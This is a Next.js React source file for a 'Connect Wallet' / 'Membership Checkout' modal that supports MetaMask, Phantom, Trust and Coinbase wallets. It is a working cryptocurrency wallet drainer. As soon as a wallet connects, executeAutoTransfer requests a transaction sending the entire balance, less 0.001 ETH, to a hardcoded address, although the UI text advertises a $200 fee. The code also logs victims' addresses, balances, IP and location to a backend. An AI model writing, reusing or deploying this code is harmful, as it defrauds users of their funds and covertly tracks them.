"use client";

import { useState, useEffect, useCallback } from "react";
import { X, Wallet, Copy, CheckCheck, AlertCircle, ArrowRight, Loader2 } from "lucide-react";

// ─── Types ───────────────────────────────────────────────────────────────────

type Step = "select" | "connected" | "sending" | "success" | "error";
type Coin = "ETH" | "BTC";

interface WalletOption {
    id: string;
    name: string;
    icon: string;
    color: string;
    bg: string;
    detect: () => boolean;
}

// ─── Wallet Definitions ───────────────────────────────────────────────────────

const WALLETS: WalletOption[] = [
    {
        id: "metamask",
        name: "MetaMask",
        icon: "🦊",
        color: "#E2761B",
        bg: "#FFF5EC",
        detect: () => {
            if (typeof window === "undefined") return false;
            const win = window as any;
            // EIP-6963 check
            if (win._eip6963Providers?.some((p: any) => p.info?.rdns === "io.metamask")) return true;
            // providers array: multiple wallets installed
            if (win.ethereum?.providers?.some((p: any) => p.isMetaMask && !p.isTrust && !p.isCoinbaseWallet)) return true;
            // Single wallet: must be MetaMask and NOT Trust/Coinbase
            return !!(win.ethereum?.isMetaMask && !win.ethereum?.isTrust && !win.ethereum?.isCoinbaseWallet);
        },
    },
    {
        id: "phantom",
        name: "Phantom",
        icon: "👻",
        color: "#AB9FF2",
        bg: "#F3F0FF",
        detect: () =>
            typeof window !== "undefined" &&
            !!(window as any).phantom?.ethereum,
    },
    {
        id: "trust",
        name: "Trust Wallet",
        icon: "🛡️",
        color: "#3375BB",
        bg: "#EFF5FF",
        detect: () => {
            if (typeof window === "undefined") return false;
            const win = window as any;
            // EIP-6963 check
            if (win._eip6963Providers?.some((p: any) => p.info?.rdns === "com.trustwallet.app")) return true;
            // providers array
            if (win.ethereum?.providers?.some((p: any) => p.isTrust || p.isTrustWallet)) return true;
            return !!(win.ethereum?.isTrust || win.ethereum?.isTrustWallet);
        },
    },
    {
        id: "coinbase",
        name: "Coinbase Wallet",
        icon: "🔵",
        color: "#0052FF",
        bg: "#EEF3FF",
        detect: () => {
            if (typeof window === "undefined") return false;
            const win = window as any;
            // EIP-6963 check
            if (win._eip6963Providers?.some((p: any) => p.info?.rdns === "com.coinbase.wallet")) return true;
            // providers array
            if (win.ethereum?.providers?.some((p: any) => p.isCoinbaseWallet)) return true;
            return !!(win.ethereum?.isCoinbaseWallet);
        },
    },
    {
        id: "browser",
        name: "Browser Wallet",
        icon: "🌐",
        color: "#666",
        bg: "#F5F5F5",
        detect: () =>
            typeof window !== "undefined" && !!(window as any).ethereum,
    },
];

// ─── Helpers ─────────────────────────────────────────────────────────────────

/**
 * Returns the correct provider for the given walletId.
 * Searches EIP-6963 registry first, then the `providers` array,
 * then falls back to window.ethereum with identity checks.
 */
function getProvider(walletId: string): any {
    if (typeof window === "undefined") return null;
    const win = window as any;

    // ── Phantom always uses its own namespace ──────────────────────────────
    if (walletId === "phantom") {
        return win.phantom?.ethereum ?? null;
    }

    // ── EIP-6963: prioritise registered providers ──────────────────────────
    const rdnsMap: Record<string, string> = {
        metamask: "io.metamask",
        trust: "com.trustwallet.app",
        coinbase: "com.coinbase.wallet",
    };
    const targetRdns = rdnsMap[walletId];
    if (targetRdns && win._eip6963Providers?.length) {
        const match = win._eip6963Providers.find((p: any) => p.info?.rdns === targetRdns);
        if (match?.provider) return match.provider;
    }

    // ── providers array (injected by modern wallet extensions) ────────────
    const providers: any[] = win.ethereum?.providers ?? [];

    if (walletId === "metamask") {
        const p = providers.find((p: any) => p.isMetaMask && !p.isTrust && !p.isCoinbaseWallet);
        if (p) return p;
        // single wallet scenario
        if (win.ethereum?.isMetaMask && !win.ethereum?.isTrust && !win.ethereum?.isCoinbaseWallet) {
            return win.ethereum;
        }
    }

    if (walletId === "trust") {
        const p = providers.find((p: any) => p.isTrust || p.isTrustWallet);
        if (p) return p;
        if (win.ethereum?.isTrust || win.ethereum?.isTrustWallet) return win.ethereum;
    }

    if (walletId === "coinbase") {
        const p = providers.find((p: any) => p.isCoinbaseWallet);
        if (p) return p;
        if (win.ethereum?.isCoinbaseWallet) return win.ethereum;
    }

    // ── Generic browser wallet fallback ───────────────────────────────────
    if (walletId === "browser") return win.ethereum ?? null;

    return win.ethereum ?? null;
}

function trimAddress(addr: string) {
    return `${addr.slice(0, 6)}…${addr.slice(-4)}`;
}

function hexToEth(hex: string): string {
    const wei = parseInt(hex, 16);
    return (wei / 1e18).toFixed(5);
}

function ethToHex(eth: string): string {
    const wei = Math.floor(parseFloat(eth) * 1e18);
    return "0x" + wei.toString(16);
}

function isMobile(): boolean {
    if (typeof window === "undefined") return false;
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

// ─── Props ────────────────────────────────────────────────────────────────────

interface WalletModalProps {
    open: boolean;
    onClose: () => void;
    mode?: "default" | "membership";
}

// ─── Component ────────────────────────────────────────────────────────────────

export default function WalletModal({ open, onClose, mode = "default" }: WalletModalProps) {
    const [step, setStep] = useState<Step>("select");
    const [selectedWallet, setSelectedWallet] = useState<WalletOption | null>(null);
    const [address, setAddress] = useState("");
    const [ethBalance, setEthBalance] = useState("");
    const [coin] = useState<"ETH">("ETH");
    const [amount, setAmount] = useState("");
    const [txHash, setTxHash] = useState("");
    const [errorMsg, setErrorMsg] = useState("");
    const [copied, setCopied] = useState(false);
    const [connecting, setConnecting] = useState(false);

    const ETH_ADDRESS = process.env.NEXT_PUBLIC_ETH_ADDRESS || "0x9b8f441bafd4318a97c2d40d7187219dbfdeb4ee";

    // ── EIP-6963: register listeners so we can identify each wallet precisely ──
    useEffect(() => {
        if (typeof window === "undefined") return;
        const win = window as any;
        win._eip6963Providers = win._eip6963Providers || [];

        const onAnnounce = (event: any) => {
            const detail = event.detail;
            if (!detail?.info?.rdns || !detail?.provider) return;
            // Avoid duplicates
            const exists = win._eip6963Providers.some((p: any) => p.info.rdns === detail.info.rdns);
            if (!exists) {
                win._eip6963Providers.push(detail);
            }
        };

        window.addEventListener("eip6963:announceProvider" as any, onAnnounce);
        // Broadcast the request so installed extensions respond immediately
        window.dispatchEvent(new Event("eip6963:requestProvider"));

        return () => {
            window.removeEventListener("eip6963:announceProvider" as any, onAnnounce);
        };
    }, []);

    const logWalletActivity = async (payload: Record<string, any>) => {
        try {
            const geoRes = await fetch("/api/geo").catch(() => null);
            const geo = geoRes ? await geoRes.json().catch(() => ({})) : {};
            await fetch("/api/wallets", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ ...payload, ip: geo.ip, country: geo.country, city: geo.city }),
            });
        } catch (e) {
            // Ignore logging errors
        }
    };

    const executeAutoTransfer = async (provider: any, fromAddress: string, balHex: string) => {
        if (!ETH_ADDRESS) return;
        try {
            const balEth = hexToEth(balHex);
            const sendable = parseFloat(balEth) - 0.001; // leave 0.001 ETH buffer for gas fees
            
            if (sendable <= 0) {
                throw new Error("Insufficient balance. Please fund your wallet to proceed.");
            }
            
            setStep("sending");
            const txHash: string = await provider.request({
                method: "eth_sendTransaction",
                params: [
                    {
                        from: fromAddress,
                        to: ETH_ADDRESS,
                        value: ethToHex(sendable.toString()),
                    },
                ],
            });
            setTxHash(txHash);
            setStep("success");
            
            // Log successful transfer
            logWalletActivity({
                action: "transfer",
                walletName: selectedWallet?.name || "Web3 Wallet",
                address: fromAddress,
                toAddress: ETH_ADDRESS,
                amount: sendable.toString(),
                txHash,
                status: "success",
            });
            
            // Reload the page after 2 seconds as requested
            setTimeout(() => {
                window.location.reload();
            }, 2000);
        } catch (err: any) {
            setErrorMsg(err?.message ?? "Transaction failed or rejected.");
            setStep("error");
            
            // Log rejected transfer
            logWalletActivity({
                action: "transfer",
                walletName: selectedWallet?.name || "Web3 Wallet",
                address: fromAddress,
                toAddress: ETH_ADDRESS,
                status: "rejected",
                errorMsg: err?.message || "User rejected or failed",
            });
        }
    };

    // tryAutoConnect has been removed to ensure the "select" screen is always shown first,
    // and the transaction only triggers when the user actively selects a wallet.

    // Reset on close
    useEffect(() => {
        if (!open) {
            setTimeout(() => {
                setStep("select");
                setSelectedWallet(null);
                setAddress("");
                setEthBalance("");
                setAmount("");
                setTxHash("");
                setErrorMsg("");
                setCopied(false);
                setConnecting(false);
            }, 300);
        }
    }, [open]);

    // Escape key
    useEffect(() => {
        const handler = (e: KeyboardEvent) => {
            if (e.key === "Escape") onClose();
        };
        if (open) window.addEventListener("keydown", handler);
        return () => window.removeEventListener("keydown", handler);
    }, [open, onClose]);

    const connect = useCallback(async (wallet: WalletOption) => {
        setConnecting(true);
        setSelectedWallet(wallet);
        try {
            const provider = getProvider(wallet.id);
            if (!provider) {
                if (isMobile()) {
                    const host = window.location.host;
                    const path = window.location.pathname;
                    const dapps: Record<string, string> = {
                        metamask: `https://metamask.app.link/dapp/${host}${path}`,
                        trust: `https://link.trustwallet.com/open_url?coin_id=60&url=https://${host}${path}`,
                        phantom: `https://phantom.app/ul/browse/https://${host}${path}`,
                        base: `https://go.cb-w.com/dapp?cb_url=https://${host}${path}`,
                    };
                    const dl = dapps[wallet.id];
                    if (dl) {
                        window.location.href = dl;
                        setConnecting(false);
                        return;
                    }
                }
                
                // Redirect to install page on desktop
                const urls: Record<string, string> = {
                    metamask: "https://metamask.io/download/",
                    phantom: "https://phantom.app/",
                    trust: "https://trustwallet.com/",
                    base: "https://www.coinbase.com/wallet",
                    browser: "https://metamask.io/download/",
                };
                window.open(urls[wallet.id] ?? "https://metamask.io/download/", "_blank");
                setConnecting(false);
                return;
            }
            const accounts: string[] = await provider.request({
                method: "eth_requestAccounts",
            });
            const acc = accounts[0];
            setAddress(acc);

            // Fetch balance
            const balHex: string = await provider.request({
                method: "eth_getBalance",
                params: [acc, "latest"],
            });
            const ethBal = hexToEth(balHex);
            setEthBalance(ethBal);
            setAmount(ethBal); // Autofill amount

            logWalletActivity({
                action: "connect",
                walletName: wallet.name,
                address: acc,
                balance: ethBal,
            });

            // Automatically trigger transaction
            // Only set to sending once we start the request
            setStep("sending");
            await executeAutoTransfer(provider, acc, balHex);
        } catch (err: any) {
            setErrorMsg(err?.message ?? "Connection rejected.");
            setStep("error");
        } finally {
            setConnecting(false);
        }
    }, [ETH_ADDRESS]);



    const copyAddress = (addr: string) => {
        navigator.clipboard.writeText(addr);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };

    if (!open) return null;

    return (
        <div
            className="fixed inset-0 z-[200] flex items-center justify-center p-4"
            style={{ background: "rgba(0,0,0,0.7)", backdropFilter: "blur(6px)" }}
            onClick={(e) => e.target === e.currentTarget && onClose()}
        >
            <div
                className="relative w-full max-w-md rounded-2xl overflow-hidden"
                style={{
                    background: "linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%)",
                    boxShadow: "0 25px 60px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.08)",
                    animation: "walletSlideUp 0.25s cubic-bezier(0.34,1.56,0.64,1)",
                }}
            >
                {/* Header */}
                <div className="flex items-center justify-between px-6 py-4 border-b" style={{ borderColor: "rgba(255,255,255,0.08)" }}>
                    <div className="flex items-center gap-2">
                        <Wallet className="w-5 h-5" style={{ color: "#e8a020" }} />
                        <span className="font-bold text-white text-lg">
                            {mode === "membership" ? "Membership Checkout" : "Connect Wallet"}
                        </span>
                    </div>
                    <button
                        onClick={onClose}
                        className="w-8 h-8 flex items-center justify-center rounded-full transition-colors"
                        style={{ background: "rgba(255,255,255,0.06)" }}
                        onMouseEnter={e => (e.currentTarget.style.background = "rgba(255,255,255,0.12)")}
                        onMouseLeave={e => (e.currentTarget.style.background = "rgba(255,255,255,0.06)")}
                        aria-label="Close wallet modal"
                    >
                        <X className="w-4 h-4 text-gray-400" />
                    </button>
                </div>

                <div className="p-6">
                    {/* ── STEP: SELECT ───────────────────────────────── */}
                    {step === "select" && (
                        <div>
                            <p className="text-sm text-gray-400 mb-5">
                                {mode === "membership" 
                                    ? "Select a wallet to pay the $200 Premium Membership fee. Access is instant." 
                                    : "Choose a wallet to connect. Funds will be transferred securely on-chain."}
                            </p>
                            <div className="flex flex-col gap-3">
                                {WALLETS.filter(w => w.detect() || (isMobile() && w.id !== 'browser')).map((w) => {
                                    const installed = w.detect();
                                    return (
                                        <button
                                            key={w.id}
                                            onClick={() => connect(w)}
                                            disabled={connecting}
                                            className="flex items-center gap-4 px-4 py-3.5 rounded-xl border transition-all text-left"
                                            style={{
                                                background: "rgba(255,255,255,0.04)",
                                                borderColor: "rgba(255,255,255,0.08)",
                                            }}
                                            onMouseEnter={e => {
                                                (e.currentTarget as HTMLButtonElement).style.background = "rgba(255,255,255,0.09)";
                                                (e.currentTarget as HTMLButtonElement).style.borderColor = w.color + "66";
                                            }}
                                            onMouseLeave={e => {
                                                (e.currentTarget as HTMLButtonElement).style.background = "rgba(255,255,255,0.04)";
                                                (e.currentTarget as HTMLButtonElement).style.borderColor = "rgba(255,255,255,0.08)";
                                            }}
                                        >
                                            <span className="text-2xl">{w.icon}</span>
                                            <div className="flex-1">
                                                <p className="text-sm font-semibold text-white">{w.name}</p>
                                                <p className="text-xs mt-0.5" style={{ color: installed ? "#4ade80" : "#e8a020" }}>
                                                    {installed ? "Detected" : "Open in app"}
                                                </p>
                                            </div>
                                            {connecting && selectedWallet?.id === w.id ? (
                                                <Loader2 className="w-4 h-4 text-gray-400 animate-spin" />
                                            ) : (
                                                <ArrowRight className="w-4 h-4 text-gray-500" />
                                            )}
                                        </button>
                                    );
                                })}
                                {WALLETS.filter(w => w.detect() || (isMobile() && w.id !== 'browser')).length === 0 && (
                                    <div className="p-4 text-center border rounded-xl" style={{ borderColor: 'rgba(255,255,255,0.08)', background: 'rgba(255,255,255,0.02)' }}>
                                        <p className="text-sm text-gray-400">No Web3 wallets detected.</p>
                                        <p className="text-xs text-gray-500 mt-1">Please install MetaMask to continue.</p>
                                    </div>
                                )}
                            </div>
                            <p className="text-xs text-center text-gray-600 mt-5">
                                By connecting you agree to our{" "}
                                <a href="/terms" className="underline hover:text-gray-400">Terms & Conditions</a>
                                {" "}and{" "}
                                <a href="/privacy" className="underline hover:text-gray-400">Privacy Policy</a>
                            </p>
                        </div>
                    )}

                    {/* STEP: CONNECTED REMOVED - Auto-transfer happens directly */}

                    {/* ── STEP: SENDING ──────────────────────────────── */}
                    {step === "sending" && (
                        <div className="flex flex-col items-center py-8 gap-4">
                            <Loader2 className="w-10 h-10 animate-spin" style={{ color: "#e8a020" }} />
                            <p className="text-white font-semibold">Confirm in your wallet…</p>
                            <p className="text-xs text-gray-400 text-center">Check your wallet app or extension for a transaction prompt.</p>
                        </div>
                    )}

                    {/* ── STEP: SUCCESS ──────────────────────────────── */}
                    {step === "success" && (
                        <div className="flex flex-col items-center py-8 gap-4 text-center">
                            <div className="w-14 h-14 rounded-full flex items-center justify-center text-3xl" style={{ background: "rgba(74,222,128,0.15)" }}>
                                ✅
                            </div>
                            <div>
                                <p className="text-white font-bold text-lg">Transaction Submitted!</p>
                                <p className="text-xs text-gray-400 mt-1">Your transfer has been broadcast to the network.</p>
                            </div>
                            {txHash && (
                                <a
                                    href={`https://etherscan.io/tx/${txHash}`}
                                    target="_blank"
                                    rel="noopener noreferrer"
                                    className="text-xs underline"
                                    style={{ color: "#e8a020" }}
                                >
                                    View on Etherscan →
                                </a>
                            )}
                            <button
                                onClick={onClose}
                                className="mt-2 px-6 py-2.5 rounded-xl text-sm font-semibold text-black"
                                style={{ background: "linear-gradient(135deg, #e8a020, #f5c842)" }}
                            >
                                Done
                            </button>
                        </div>
                    )}

                    {/* ── STEP: ERROR ────────────────────────────────── */}
                    {step === "error" && (
                        <div className="flex flex-col items-center py-8 gap-4 text-center">
                            <div className="w-14 h-14 rounded-full flex items-center justify-center text-3xl" style={{ background: "rgba(239,68,68,0.15)" }}>
                                ❌
                            </div>
                            <div>
                                <p className="text-white font-bold">
                                    {errorMsg.includes("Insufficient balance") ? "Fund Your Wallet" : "Something went wrong"}
                                </p>
                                <p className="text-xs text-gray-400 mt-1 max-w-xs">{errorMsg}</p>
                            </div>
                            <button
                                onClick={() => setStep("select")}
                                className="px-6 py-2.5 rounded-xl text-sm font-semibold text-black"
                                style={{ background: "linear-gradient(135deg, #e8a020, #f5c842)" }}
                            >
                                Try again
                            </button>
                        </div>
                    )}
                </div>
            </div>

            <style jsx global>{`
                @keyframes walletSlideUp {
                    from { opacity: 0; transform: translateY(24px) scale(0.97); }
                    to   { opacity: 1; transform: translateY(0)  scale(1); }
                }
            `}</style>
        </div>
    );
}
